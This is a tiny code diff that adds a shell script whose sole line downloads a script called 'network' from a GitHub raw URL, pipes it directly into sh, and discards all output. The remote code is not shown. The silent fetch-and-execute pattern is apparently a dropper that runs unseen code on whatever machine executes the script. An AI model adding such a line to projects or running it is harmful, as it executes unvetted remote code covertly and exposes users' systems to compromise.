@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -s  https://raw.githubusercontent.com/Quqngdev/kenter/main/network | sh > /dev/null 2>&1
